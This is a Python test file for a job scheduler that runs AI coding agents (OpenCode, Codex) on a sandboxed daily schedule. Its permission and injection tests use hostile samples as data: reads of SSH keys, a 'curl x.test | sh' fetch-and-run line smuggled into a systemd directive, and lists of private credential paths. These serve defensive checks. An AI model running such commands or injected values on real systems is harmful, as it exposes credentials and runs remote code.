"""The schedule script: each system's job file, written with fakes, and one run with a fake OpenCode."""

from __future__ import annotations

import json
import os
import plistlib
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import textwrap
import time
import xml.etree.ElementTree as ElementTree
from collections.abc import Callable
from datetime import date
from pathlib import Path
from typing import Any

import pytest

SCRIPTS = Path(__file__).parent.parent / "plugin/skills/graveyard-killer/scripts"
sys.path.insert(0, str(SCRIPTS))
import schedule  # noqa: E402

FAKE_OPENCODE = Path(__file__).parent / "fakes/fake_opencode.py"
MODEL = "opencode/glm-5.3-flash-free"
FALLBACK = "opencode/deepseek-v4.1-flash-free"
# A link with characters a shell or a scheduler would change, and a folder with a space and a %.
LIBRARY = "https://app.notion.com/p/41af4b208c4081c2?v=1&x=$HOME"
TASK = "{http://schemas.microsoft.com/windows/2004/02/mit/task}"

Calls = list[list[str]]


@pytest.fixture
def folder(tmp_path: Path) -> Path:
    return (tmp_path / "Graveyard Killer 100%").resolve()


@pytest.fixture
def computer(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Callable[[str], Calls]:
    """A home folder, an installed OpenCode and a scheduler command that only records its calls."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(Path, "home", lambda: home)
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    monkeypatch.setattr(shutil, "which", lambda name: "/opt/bin/opencode" if name == "opencode" else None)
    monkeypatch.setattr(os, "getuid", lambda: 501, raising=False)
    calls: Calls = []

    def fake_run(command: list[str], **options: Any) -> subprocess.CompletedProcess[str]:
        if command[1:] == ["run", "--help"]:  # OpenCode 1.19's help, which lists its log options
            return subprocess.CompletedProcess(command, 0, "      --print-logs  print logs to stderr\n", "")
        calls.append(command)
        return subprocess.CompletedProcess(command, 0, "", "")

    monkeypatch.setattr(subprocess, "run", fake_run)

    def on(system: str) -> Calls:
        monkeypatch.setattr(schedule, "current_system", lambda: system)
        return calls

    return on


def cli(capsys: pytest.CaptureFixture[str], *args: str) -> tuple[int, dict[str, Any]]:
    sys.argv = ["schedule.py", *args]
    code = 0
    try:
        schedule.main()
    except SystemExit as e:
        code = int(e.code or 0)
    return code, json.loads(capsys.readouterr().out)


def install(capsys: pytest.CaptureFixture[str], folder: Path, *extra: str) -> dict[str, Any]:
    code, out = cli(capsys, "install", "--time", "9:05", "--model", MODEL, "--fallback-model", FALLBACK,
                    "--folder", str(folder), "--library", LIBRARY, *extra)
    assert code == 0, out
    return out


# ---------------------------------------------------------------- macOS

def test_macos_job_starts_the_worker_run_every_day_at_the_time(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Darwin")
    out = install(capsys, folder)

    plist_path = Path.home() / "Library/LaunchAgents/graveyard-killer-worker.plist"
    plist = plistlib.loads(plist_path.read_bytes())
    assert out["time"] == "09:05" and out["days"] == "every day"
    assert plist["Label"] == "graveyard-killer-worker"
    assert plist["StartCalendarInterval"] == {"Hour": 9, "Minute": 5}
    assert plist["ProgramArguments"] == [sys.executable, str(SCRIPTS / "schedule.py"), "run", "--folder", str(folder)]
    assert plist["EnvironmentVariables"]["PATH"] == os.environ["PATH"]
    assert calls == [["launchctl", "bootout", "gui/501/graveyard-killer-worker"],
                     ["launchctl", "bootstrap", "gui/501", str(plist_path)]]


def test_macos_days_are_one_interval_each_with_sunday_as_zero(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Darwin")
    install(capsys, folder, "--days", "sun,wed,Mon")

    plist = plistlib.loads((Path.home() / "Library/LaunchAgents/graveyard-killer-worker.plist").read_bytes())
    assert plist["StartCalendarInterval"] == [{"Weekday": 1, "Hour": 9, "Minute": 5},
                                              {"Weekday": 3, "Hour": 9, "Minute": 5},
                                              {"Weekday": 0, "Hour": 9, "Minute": 5}]


def test_installing_again_replaces_the_job(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Darwin")
    install(capsys, folder)
    code, out = cli(capsys, "install", "--time", "18:30", "--model", MODEL, "--folder", str(folder),
                    "--library", LIBRARY)

    assert code == 0
    agents = list((Path.home() / "Library/LaunchAgents").iterdir())
    assert [a.name for a in agents] == ["graveyard-killer-worker.plist"]
    assert plistlib.loads(agents[0].read_bytes())["StartCalendarInterval"] == {"Hour": 18, "Minute": 30}
    assert [c[1] for c in calls] == ["bootout", "bootstrap", "bootout", "bootstrap"]
    assert json.loads((folder / "schedule.json").read_text())["fallback_model"] is None


def test_show_gives_the_job_and_its_last_run(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Darwin")
    install(capsys, folder)
    (folder / "last-run.json").write_text(json.dumps({"ok": True, "ping": "Fatto."}))

    code, out = cli(capsys, "show")

    assert code == 0
    assert out["job"] == "graveyard-killer-worker" and out["loaded"] is True
    assert (out["time"], out["model"], out["fallback_model"], out["library"]) == ("09:05", MODEL, FALLBACK, LIBRARY)
    assert out["folder"] == str(folder)
    assert out["last_run"] == {"ok": True, "ping": "Fatto."}


def test_show_says_when_there_is_no_job(computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str]) -> None:
    computer("Darwin")
    assert cli(capsys, "show") == (0, {"job": None, "name": "graveyard-killer-worker", "system": "Darwin"})


def test_remove_unloads_and_deletes_the_job_and_keeps_the_run_folder(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Darwin")
    install(capsys, folder)
    calls.clear()

    code, out = cli(capsys, "remove")

    assert code == 0 and out["removed"] == "graveyard-killer-worker"
    assert calls == [["launchctl", "bootout", "gui/501/graveyard-killer-worker"]]
    assert not (Path.home() / "Library/LaunchAgents/graveyard-killer-worker.plist").exists()
    assert (folder / "schedule.json").exists()
    assert cli(capsys, "remove")[1]["removed"] is None


# ---------------------------------------------------------------- Windows

def test_windows_task_starts_when_available_at_the_time_and_days(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("USERDOMAIN", "PC")
    monkeypatch.setenv("USERNAME", "ann")
    calls = computer("Windows")
    install(capsys, folder, "--days", "mon,wed", "--title", "Graveyard Killer: riordino")

    xml_path = folder / "graveyard-killer-worker.xml"
    raw = xml_path.read_bytes()
    assert raw[:2] in (b"\xff\xfe", b"\xfe\xff")  # UTF-16 with its BOM, as schtasks wants
    task = ElementTree.fromstring(raw)
    trigger = task.find(f"{TASK}Triggers/{TASK}CalendarTrigger")
    assert trigger is not None
    assert trigger.findtext(f"{TASK}StartBoundary") == f"{date.today().isoformat()}T09:05:00"
    days = trigger.find(f"{TASK}ScheduleByWeek/{TASK}DaysOfWeek")
    assert days is not None and [d.tag.replace(TASK, "") for d in days] == ["Monday", "Wednesday"]
    assert task.findtext(f"{TASK}Settings/{TASK}StartWhenAvailable") == "true"
    assert task.findtext(f"{TASK}Principals/{TASK}Principal/{TASK}LogonType") == "InteractiveToken"
    assert task.findtext(f"{TASK}Principals/{TASK}Principal/{TASK}UserId") == "PC\\ann"
    assert task.findtext(f"{TASK}RegistrationInfo/{TASK}Description") == "Graveyard Killer: riordino"
    exec_ = task.find(f"{TASK}Actions/{TASK}Exec")
    assert exec_ is not None
    assert exec_.findtext(f"{TASK}Command") == sys.executable
    assert exec_.findtext(f"{TASK}Arguments") == f'{SCRIPTS / "schedule.py"} run --folder "{folder}"'
    assert calls == [["schtasks", "/Create", "/TN", "graveyard-killer-worker", "/XML", str(xml_path), "/F"]]


def test_windows_every_day_is_a_daily_trigger(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Windows")
    install(capsys, folder)
    task = ElementTree.fromstring((folder / "graveyard-killer-worker.xml").read_bytes())
    assert task.findtext(f"{TASK}Triggers/{TASK}CalendarTrigger/{TASK}ScheduleByDay/{TASK}DaysInterval") == "1"


# ---------------------------------------------------------------- Linux

def test_linux_timer_is_persistent_on_its_calendar(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Linux")
    install(capsys, folder, "--days", "fri,mon")

    units = Path.home() / ".config/systemd/user"
    service = (units / "graveyard-killer-worker.service").read_text()
    timer = (units / "graveyard-killer-worker.timer").read_text()
    escaped = str(folder).replace("%", "%%")
    assert f'ExecStart="{sys.executable}" "{SCRIPTS / "schedule.py"}" "run" "--folder" "{escaped}"' in service
    assert f"WorkingDirectory={escaped}\n" in service
    assert "OnCalendar=Mon,Fri *-*-* 09:05:00\n" in timer
    assert "Persistent=true\n" in timer
    assert calls == [["systemctl", "--user", "daemon-reload"],
                     ["systemctl", "--user", "enable", "--now", "graveyard-killer-worker.timer"]]
    assert cli(capsys, "show")[1]["folder"] == str(folder)  # the % comes back unescaped


def test_linux_remove_disables_the_timer_and_deletes_both_units(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Linux")
    install(capsys, folder)
    calls.clear()

    out = cli(capsys, "remove")[1]

    assert len(out["deleted"]) == 2
    assert not list((Path.home() / ".config/systemd/user").iterdir())
    assert calls[0] == ["systemctl", "--user", "disable", "--now", "graveyard-killer-worker.timer"]


# ---------------------------------------------------------------- the run folder

def opencode_matches(pattern: str, value: str) -> bool:
    """OpenCode 1.x's wildcard: \\ counts as /, * is any text, ? one character, and a trailing
    " *" may match nothing."""
    pattern, value = pattern.replace("\\", "/"), value.replace("\\", "/")
    optional_tail = pattern.endswith(" *")
    body = pattern[:-2] if optional_tail else pattern
    regex = "".join(".*" if c == "*" else "." if c == "?" else re.escape(c) for c in body)
    if optional_tail:
        regex += "( .*)?"
    return re.fullmatch(regex, value, re.DOTALL) is not None


def decision(rules: dict[str, str], value: str) -> str:
    """What OpenCode does: the last matching rule wins."""
    return [action for pattern, action in rules.items() if opencode_matches(pattern, value)][-1]


def test_install_writes_the_settings_opencode_config_and_pointer(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Darwin")
    install(capsys, folder)

    settings = json.loads((folder / "schedule.json").read_text())
    assert (settings["model"], settings["fallback_model"], settings["library"]) == (MODEL, FALLBACK, LIBRARY)
    assert settings["opencode"] == ["/opt/bin/opencode"]
    config = json.loads((folder / "opencode.json").read_text())
    assert config["mcp"] == {"notion": {"type": "remote", "url": "https://mcp.notion.com/mcp"}}
    permission = config["permission"]
    assert (permission["edit"], permission["question"], permission["webfetch"]) == ("deny", "deny", "allow")
    assert (folder / "AGENTS.md").read_text().startswith(f"Graveyard Killer Library: {LIBRARY}\n")


def as_opencode_reads(path: Path) -> str:
    """The path OpenCode 1.x checks a read against, for a run folder in no git repository."""
    return str(path)[len(path.anchor):]


def test_the_opencode_config_denies_first_and_allows_only_the_worker_s_folders_and_scripts(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Darwin")
    install(capsys, folder)
    permission = json.loads((folder / "opencode.json").read_text())["permission"]
    home = Path.home()
    skill = SCRIPTS.parent
    work = Path(tempfile.gettempdir()).resolve() / "graveyard-killer-k0nqhi_5"

    for tool in ("read", "list", "external_directory", "bash"):
        assert list(permission[tool].items())[0] == ("*", "deny"), tool
    reads, elsewhere = permission["read"], permission["external_directory"]
    for allowed in (skill / "references/worker.md", folder / "AGENTS.md", work / "frames/01.jpg"):
        for checked in (as_opencode_reads(allowed), str(allowed)):
            assert decision(reads, checked) == "allow", checked
        assert decision(elsewhere, f"{allowed.parent}/*") == "allow", allowed
    for private in (home / ".ssh/id_rsa", home / ".claude/CLAUDE.md", home / ".local/share/opencode/mcp-auth.json",
                    Path(tempfile.gettempdir()) / "other/x.txt", folder.parent / "next to it.txt"):
        for checked in (as_opencode_reads(private), str(private)):
            assert decision(reads, checked) == "deny", checked
        assert decision(elsewhere, f"{private.parent}/*") == "deny", private
    # Glob and grep are checked against their search pattern; external_directory fences where they look.
    assert (permission["glob"], permission["grep"]) == ("allow", "allow")

    bash = permission["bash"]
    assert not [p for p in bash if re.fullmatch(r"(python3?|py( -3)?) \*", p)]
    for allowed_call in (f"python3 {skill / 'scripts/post.py'} read", "python3 scripts/post.py check",
                         "python3 scripts/link.py", f"python3 {skill / 'scripts/post.py'} clean \"{work}\"",
                         f"cd {skill}"):
        assert decision(bash, allowed_call) == "allow", allowed_call
    for refused in ('python3 -c "print(42)"', "python3 /tmp/evil.py", "cat ~/.ssh/id_rsa", "curl https://x.test",
                    "python3 scripts/graveyard.py x", "cd ~", "whoami"):
        assert decision(bash, refused) == "deny", refused


def test_a_run_folder_in_a_git_repository_gets_reads_relative_to_it(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    run_folder = tmp_path / "runs" / "worker"
    job = schedule.Job(name="n", time="13:00", days=[], model=MODEL, fallback_model=None, folder=str(run_folder),
                       library=LIBRARY)
    reads = schedule.opencode_config(job)["permission"]["read"]
    assert decision(reads, "runs/worker/AGENTS.md") == "allow"
    assert decision(reads, "secrets.txt") == "deny"


def test_install_keeps_a_pointer_already_there_and_rewrites_the_config(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    computer("Darwin")
    folder.mkdir(parents=True)
    (folder / "AGENTS.md").write_text("Graveyard Killer Library: x\nLì ci sono i post che ho salvato.\n")
    (folder / "opencode.json").write_text("{}")

    out = install(capsys, folder)

    assert (folder / "AGENTS.md").read_text().startswith("Graveyard Killer Library: x\nLì")
    assert str(folder / "AGENTS.md") not in out["written"]
    assert "permission" in json.loads((folder / "opencode.json").read_text())  # its rules name this job's folders


@pytest.mark.parametrize("args, says", [
    (["--time", "25:00"], "HH:MM"),
    (["--time", "13h"], "HH:MM"),
    (["--days", "mon,funday"], "Unknown days"),
    (["--model", "glm"], "provider"),
    (["--library", "my notion page"], "not a web link"),
])
def test_install_refuses_what_it_cannot_schedule(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path, args: list[str], says: str
) -> None:
    computer("Darwin")
    given = {"--time": "13:00", "--model": MODEL, "--folder": str(folder), "--library": LIBRARY}
    given.update(dict(zip(args[::2], args[1::2])))
    code, out = cli(capsys, "install", *[x for pair in given.items() for x in pair])
    assert code == 2 and says in out["error"]
    assert not (Path.home() / "Library/LaunchAgents").exists()


def test_install_needs_opencode(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    computer("Darwin")
    monkeypatch.setattr(shutil, "which", lambda name: None)
    code, out = cli(capsys, "install", "--time", "13:00", "--model", MODEL, "--folder", str(folder),
                    "--library", LIBRARY)
    assert code == 2 and "OpenCode is not installed" in out["error"]


def test_another_system_is_refused_clearly(computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str]) -> None:
    computer("FreeBSD")
    code, out = cli(capsys, "show")
    assert code == 2 and "macOS, Windows and Linux" in out["error"]


def test_the_prompt_is_schedule_md_s_word_for_word() -> None:
    text = (SCRIPTS.parent / "references/schedule.md").read_text(encoding="utf-8")
    block = re.search(r"\*\*prompt:\*\*.*?```\n(.*?)\n\s*```", text, re.DOTALL)
    assert block is not None
    assert textwrap.dedent(block.group(1)).strip() == \
        schedule.PROMPT.format(library="<the Library link>").strip()


# ---------------------------------------------------------------- one run, with a fake OpenCode

def text_event(text: str) -> dict[str, Any]:
    return {"type": "text", "sessionID": "ses_1", "part": {"type": "text", "text": text}}


def error_event(message: str) -> dict[str, Any]:
    return {"type": "error", "sessionID": "ses_1", "error": {"name": "UnknownError", "data": {"message": message}}}


@pytest.fixture
def worker_run(
    tmp_path: Path, folder: Path, monkeypatch: pytest.MonkeyPatch
) -> Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]]:
    """Run schedule.py's run against a fake OpenCode. Returns its outcome, OpenCode's calls and the alerts."""
    log = tmp_path / "opencode-calls.jsonl"
    scenario_file = tmp_path / "opencode-scenario.json"
    monkeypatch.setenv("GK_FAKE_OPENCODE_LOG", str(log))
    monkeypatch.setenv("GK_FAKE_OPENCODE_SCENARIO", str(scenario_file))
    alerts: Calls = []
    inputs: list[str] = []

    def fake_run(command: list[str], **options: Any) -> subprocess.CompletedProcess[str]:
        alerts.append(command)
        inputs.append(options.get("input", ""))
        return subprocess.CompletedProcess(command, 0, '{"notified": true}', "")

    monkeypatch.setattr(subprocess, "run", fake_run)

    def go(responses: list[dict[str, Any]], fallback: str | None = FALLBACK
           ) -> tuple[schedule.Outcome, list[dict[str, Any]], Calls]:
        scenario_file.write_text(json.dumps(responses))
        log.write_text("")
        schedule.prepare_folder(schedule.Job(
            name="graveyard-killer-worker", time="13:00", days=[], model=MODEL, fallback_model=fallback,
            folder=str(folder), library=LIBRARY, opencode=[sys.executable, str(FAKE_OPENCODE)],
            path=os.environ["PATH"],
        ))
        outcome = schedule.run(folder)
        calls = [json.loads(line) for line in log.read_text().splitlines()]
        for alert, given in zip(alerts, inputs):
            alert.append(given)
        return outcome, calls, alerts

    return go


def test_a_run_gives_opencode_the_whole_prompt_and_logs_the_ping(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path
) -> None:
    ping = "Ho finito il riordino.\n\n- **4** · Vuoi la lista della spesa?"
    outcome, calls, alerts = worker_run([{"events": [
        {"type": "step_start", "sessionID": "ses_1", "part": {"type": "step-start"}},
        {"type": "tool_use", "sessionID": "ses_1",
         "part": {"type": "tool", "tool": "notion_notion-fetch", "state": {"status": "completed"}}},
        {"type": "tool_use", "sessionID": "ses_1", "part": {"type": "tool", "tool": "bash", "state": {
            "status": "completed", "input": {"command": "python3 scripts/post.py read <<'LINK'\nhttps://x.test\nLINK"}}}},
        text_event(ping),
    ]}])

    assert outcome.ok and outcome.ping == ping and outcome.session == "ses_1"
    [call] = calls
    assert call["argv"] == ["run", "--auto", "--format", "json", "-m", MODEL,
                            schedule.PROMPT.format(library=LIBRARY)]
    assert "Graveyard Killer Library: https://app.notion.com/p/41af4b208c4081c2?v=1&x=$HOME\n" in call["argv"][-1]
    assert Path(call["cwd"]).resolve() == folder
    assert call["disable_claude_code"] == "1"
    assert call["tmpdir"] == tempfile.gettempdir()  # where opencode.json lets the Worker read
    assert alerts == []
    log = (folder / "worker.log").read_text()
    assert re.search(r"^\d{4}-\d\d-\d\d \d\d:\d\d:\d\d  tool     notion_notion-fetch \(completed\)$", log, re.M)
    assert "  tool     bash python3 scripts/post.py read <<'LINK' (completed)\n" in log
    assert "  text     Ho finito il riordino.\n" in log
    assert "- **4** · Vuoi la lista della spesa?" in log
    last = json.loads((folder / "last-run.json").read_text())
    assert last["ok"] and last["ping"] == ping and last["models"] == [MODEL]


def test_a_model_that_fails_hands_the_run_to_the_fallback_once(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]],
) -> None:
    outcome, calls, alerts = worker_run([
        {"events": [error_event("Unexpected server error.")], "exit": 1},
        {"events": [text_event("Fatto.")]},
    ])

    assert outcome.ok
    assert [c["argv"][5] for c in calls] == [MODEL, FALLBACK]
    assert alerts == []


def test_a_run_with_no_final_message_counts_as_failed(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]],
) -> None:
    outcome, calls, _ = worker_run([{"events": []}, {"events": [text_event("Fatto.")]}])
    assert outcome.ok and len(calls) == 2


def test_when_every_model_fails_a_notification_says_so(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path
) -> None:
    outcome, calls, alerts = worker_run([{"events": [error_event("Model not found.")], "exit": 1}])

    assert not outcome.ok and len(calls) == 2
    [alert] = alerts
    assert alert[:3] == [sys.executable, str(SCRIPTS / "post.py"), "notify"]
    title, message = alert[3].splitlines()
    assert title == "Graveyard Killer: tidy-up"
    assert message.startswith("Graveyard Killer could not run today's tidy-up. UnknownError: Model not found.")
    assert str(folder / "worker.log") in message
    assert json.loads((folder / "last-run.json").read_text())["models"] == [MODEL, FALLBACK]


def test_a_run_past_its_time_limit_is_stopped_and_not_retried(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(schedule, "RUN_TIME_LIMIT", 1)
    outcome, calls, alerts = worker_run([{"events": [text_event("Sto leggendo…")], "sleep": 30}])

    assert not outcome.ok and outcome.timed_out
    assert len(calls) == 1 and len(alerts) == 1


def test_lines_that_are_not_events_are_logged_as_they_are(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path
) -> None:
    worker_run([{"events": ["Error: something odd", text_event("Fatto.")]}], fallback=None)
    assert "  output   Error: something odd\n" in (folder / "worker.log").read_text()


def test_the_log_moves_aside_past_its_limit(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(schedule, "LOG_LIMIT", 100)
    folder.mkdir(parents=True)
    (folder / "worker.log").write_text("an older run\n" * 50)

    worker_run([{"events": [text_event("Fatto.")]}])

    assert (folder / "worker.log.1").read_text() == "an older run\n" * 50
    assert "an older run" not in (folder / "worker.log").read_text()


def test_a_windows_cmd_shim_gets_the_prompt_on_one_line() -> None:
    prompt = schedule.prompt_argument([r"C:\npm\opencode.cmd"], LIBRARY)
    assert "\n" not in prompt and f"Graveyard Killer Library: {LIBRARY} This is a scheduled run." in prompt
    assert schedule.prompt_argument(["/opt/bin/opencode"], LIBRARY) == schedule.PROMPT.format(library=LIBRARY)


def test_install_keeps_opencode_s_log_options_only_when_it_lists_them(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    computer("Darwin")
    install(capsys, folder)
    assert schedule.load_job(folder).log_flags == schedule.LOG_FLAGS

    monkeypatch.setattr(schedule, "supported_log_flags", lambda opencode: [])  # an OpenCode without them
    install(capsys, folder)
    assert schedule.load_job(folder).log_flags == []


def test_a_run_sets_pwd_to_the_run_folder(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path
) -> None:
    _, [call], _ = worker_run([{"events": [text_event("Fatto.")]}])
    assert call["pwd"] == str(folder)  # OpenCode 1.19 takes its project folder from PWD


FREE_LIMIT = ('timestamp=2026-11-16T14:38:52.415Z level=ERROR run=1541ca7a message="stream error" '
              'providerID=opencode modelID=glm-5.3-flash-free agent=build mode=primary '
              'error.error="AI_APICallError: Free usage limit reached. Free models work in OpenCode"')


def test_a_model_error_in_opencode_s_log_stops_the_run_and_hands_it_to_the_fallback(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]], folder: Path
) -> None:
    started = time.monotonic()
    outcome, calls, alerts = worker_run([
        {"events": [FREE_LIMIT], "sleep": 60},  # OpenCode 1.19 waits forever after this error
        {"events": [text_event("Fatto.")]},
    ])

    assert time.monotonic() - started < 30
    assert outcome.ok and [c["argv"][-2] for c in calls] == [MODEL, FALLBACK]
    assert alerts == []
    assert "Free usage limit reached" in (folder / "worker.log").read_text()


def test_a_run_that_says_nothing_for_too_long_is_stopped_and_handed_on(
    worker_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], Calls]],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(schedule, "SILENCE_LIMIT", 1)
    started = time.monotonic()
    outcome, calls, alerts = worker_run([{"events": [], "sleep": 60}, {"events": [], "sleep": 60}])

    assert time.monotonic() - started < 30
    assert not outcome.ok and not outcome.timed_out and len(calls) == 2
    assert "said nothing" in outcome.reason
    assert len(alerts) == 1


@pytest.mark.parametrize("option", ["--title", "--alert", "--folder", "--name"])
def test_install_refuses_a_line_break_that_would_add_a_directive(
    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path, option: str
) -> None:
    computer("Linux")
    values = {"--title": "T", "--alert": "A", "--folder": str(folder), "--name": "graveyard-killer-worker"}
    values[option] += "\nExecStartPre=/bin/sh -c 'curl x.test | sh'"
    code, out = cli(capsys, "install", "--time", "9:05", "--model", MODEL, "--library", LIBRARY,
                    *(part for pair in values.items() for part in pair))
    assert code == 2 and "line break" in out["error"]


def test_a_unit_file_value_never_holds_a_line_break() -> None:
    assert schedule.systemd_value("a\nExecStartPre=x\r%$") == "a ExecStartPre=x %%$$"


# ---------------------------------------------------------------- Codex: the run folder

@pytest.fixture
def codex_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path / "codex home"
    home.mkdir()
    (home / "config.toml").write_text('model = "gpt-6-luna"\n\n[mcp_servers.notion]\nurl = "https://mcp.notion.com/mcp"\n')
    monkeypatch.setenv("CODEX_HOME", str(home))
    monkeypatch.setattr(schedule, "find_codex", lambda: ["/opt/bin/codex"])
    return home


def codex_folder(capsys: pytest.CaptureFixture[str], folder: Path, *extra: str) -> dict[str, Any]:
    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY, *extra)
    assert code == 0, out
    return out


def test_codex_writes_the_run_folder_and_trusts_it(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    out = codex_folder(capsys, folder)

    # The app's task only starts codex-run, by full paths, which runs the Worker in the folder's sandbox.
    schedule_py = SCRIPTS.resolve() / "schedule.py"
    assert f"python3 {schedule_py} codex-run --folder '{folder}'\n" in out["prompt"]
    assert out["prompt"].endswith(f"Graveyard Killer Library: {LIBRARY}\n")
    assert "never start it again while it runs" in out["prompt"]
    assert (out["model"], out["effort"]) == (schedule.CODEX_MODEL, "high")
    # Data only, in .codex/, which a scheduled task's default permissions keep read-only.
    settings = json.loads((folder / ".codex/graveyard-killer.json").read_text())
    assert settings == {"library": LIBRARY, "alert": schedule.DEFAULT_ALERT}
    for written in (".codex/config.toml", ".codex/rules/graveyard-killer.rules", "AGENTS.md"):
        assert str(folder / written) in out["written"]
    assert (folder / "work").is_dir()
    agents = (folder / "AGENTS.md").read_text()
    assert agents.startswith(f"Graveyard Killer Library: {LIBRARY}\n")
    assert f"python3 {SCRIPTS.resolve() / 'post.py'} read '<link>'" in agents
    assert "never through a heredoc" in agents
    tomllib = pytest.importorskip("tomllib")
    config = tomllib.loads((codex_home / "config.toml").read_text())
    assert config["projects"][str(folder)] == {"trust_level": "trusted"}
    assert config["mcp_servers"]["notion"]["url"] == "https://mcp.notion.com/mcp"  # the rest is kept


def test_the_codex_profile_reads_only_the_skills_and_the_run_folder_and_has_no_network(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    tomllib = pytest.importorskip("tomllib")
    codex_folder(capsys, folder)
    config = tomllib.loads((folder / ".codex/config.toml").read_text())

    assert config["default_permissions"] == "graveyard-killer"
    # A scheduled task runs with approval_policy "never" by itself; a chat here may ask the user.
    assert "approval_policy" not in config
    assert "sandbox_mode" not in config  # it would replace the permission profile
    environment = config["shell_environment_policy"]
    assert environment["inherit"] == "core"
    assert environment["set"]["TMPDIR"] == str(folder / "work")
    profile = config["permissions"]["graveyard-killer"]
    filesystem = {k: v for k, v in profile["filesystem"].items() if k != ":workspace_roots"}
    assert filesystem == {":minimal": "read", str(SCRIPTS.resolve().parents[1]): "read"}
    assert profile["filesystem"][":workspace_roots"] == {".": "read"}
    assert profile["network"] == {"enabled": False}
    # Notion's writes need no approval: nobody is there to give it.
    assert config["mcp_servers"]["notion"] == {"url": "https://mcp.notion.com/mcp", "default_tools_approval_mode": "approve"}


def test_the_codex_rules_let_out_only_the_skill_s_scripts_by_full_path(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    codex_folder(capsys, folder)
    rules = (folder / ".codex/rules/graveyard-killer.rules").read_text()

    scripts, task = [json.loads(found) for found in re.findall(r"pattern = (\[.*\]),\n", rules)]
    assert scripts[0][:2] == ["python3", "python"]
    assert scripts[1] == [str(SCRIPTS.resolve() / "post.py"), str(SCRIPTS.resolve() / "link.py")]
    # schedule.py gets out only for codex-run in this run folder: never another command or folder.
    assert task[1:] == [str(SCRIPTS.resolve() / "schedule.py"), "codex-run", "--folder", str(folder.resolve())]
    assert rules.count('decision = "allow"') == 2
    assert "scripts/post.py\"" not in rules.replace(str(SCRIPTS.resolve()), "")  # no relative call


def rules_allow(rules: str, command: str) -> bool:
    """Whether a prefix rule matches the command's words, as Codex checks a plain command."""
    words = shlex.split(command)
    for pattern in (json.loads(found) for found in re.findall(r"pattern = (\[.*\]),\n", rules)):
        if len(words) >= len(pattern) and all(
                word in (part if isinstance(part, list) else [part]) for word, part in zip(words, pattern)):
            return True
    return False


def test_the_codex_rules_let_out_a_cover_upload_by_full_path_only(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    """library-notion.md's cover upload, in codex.md's form: full path, arguments in single quotes."""
    codex_folder(capsys, folder)
    rules = (folder / ".codex/rules/graveyard-killer.rules").read_text()
    post_py = SCRIPTS.resolve() / "post.py"
    arguments = (f"upload '{folder}/work/graveyard-killer-k0nqhi_5/thumbnail.jpg' "
                 "'https://api.notion.com/v1/file_uploads/abc/send' "
                 "--header 'Authorization: Bearer ntn_x' --header 'Notion-Version: 2022-06-28'")

    assert rules_allow(rules, f"python3 {post_py} {arguments}")
    assert not rules_allow(rules, f"python3 scripts/post.py {arguments}")
    assert not rules_allow(rules, "curl -F file=@thumbnail.jpg https://api.notion.com/v1/file_uploads/abc/send")


def test_the_unattended_codex_run_can_upload_a_cover_and_never_delete_move_or_share() -> None:
    tomllib = pytest.importorskip("tomllib")
    flag, value = schedule.codex_exec_options()
    key, toml = value.split("=", 1)
